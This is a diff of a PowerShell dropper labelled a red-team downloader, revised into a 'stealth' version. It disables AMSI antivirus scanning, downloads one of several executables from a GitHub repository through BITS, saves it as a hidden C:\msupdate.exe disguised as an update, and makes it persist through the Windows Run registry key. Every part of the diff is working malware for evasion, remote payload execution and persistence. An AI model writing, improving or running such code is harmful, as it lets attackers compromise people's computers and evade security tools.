@@ -1,41 +1,37 @@
-# Silent Red Team Downloader + Persistence (No Desktop)
+# Stealth version - less detectable
 $ErrorActionPreference = 'SilentlyContinue'
+
+# AMSI Bypass (common lab bypass)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 # Fast value check
 $valueUrl = "https://raw.githubusercontent.com/mrxssmaster-bot/test/refs/heads/main/value.txt"
 try {
-    $val = [int](Invoke-WebRequest -Uri $valueUrl -UseBasicParsing -TimeoutSec 8).Content.Trim()
+    $val = [int](Invoke-WebRequest -Uri $valueUrl -UseBasicParsing -TimeoutSec 5).Content.Trim()
 } catch { $val = 0 }
 
-# Choose correct payload
 switch ($val) {
-    0 { $payload = "ace.exe"; $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe" }
-    1 { $payload = "ace1.exe"; $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace1.exe" }
-    2 { $payload = "ace2.exe"; $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace2.exe" }
-    default { $payload = "ace.exe"; $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe" }
+    0 { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe" }
+    1 { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace1.exe" }
+    2 { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace2.exe" }
+    default { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe" }
 }
 
-# Use script's own directory if possible, otherwise fallback to C:\
-$scriptDir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
-if (-not $scriptDir -or $scriptDir -like "*Temp*") {
-    $scriptDir = "C:\"   # Fallback to C: root as you wanted
-}
+# Target path
+$finalPath = "C:\msupdate.exe"
 
-$finalExe = Join-Path $scriptDir "msupdate.exe"   # Renamed hidden name
-
-# Download fast to the chosen location
+# Download with BITS (more stealthy than WebClient in some cases)
 try {
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($url, $finalExe)
-} catch { exit }
+    Import-Module BitsTransfer -ErrorAction SilentlyContinue
+    Start-BitsTransfer -Source $url -Destination $finalPath -Quiet
+} catch {
+    (New-Object System.Net.WebClient).DownloadFile($url, $finalPath)
+}
 
-# Hide the file
-attrib +h $finalExe 2>$null
+# Hide + Persistence
+attrib +h $finalPath 2>$null
 
-# Persistence - points to the renamed exe in the same folder
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "MSUpdate"
-Set-ItemProperty -Path $regPath -Name $regName -Value $finalExe -Type String -Force
+Set-ItemProperty -Path $regPath -Name "MSUpdate" -Value $finalPath -Type String -Force
 
-# Clean exit
 exit
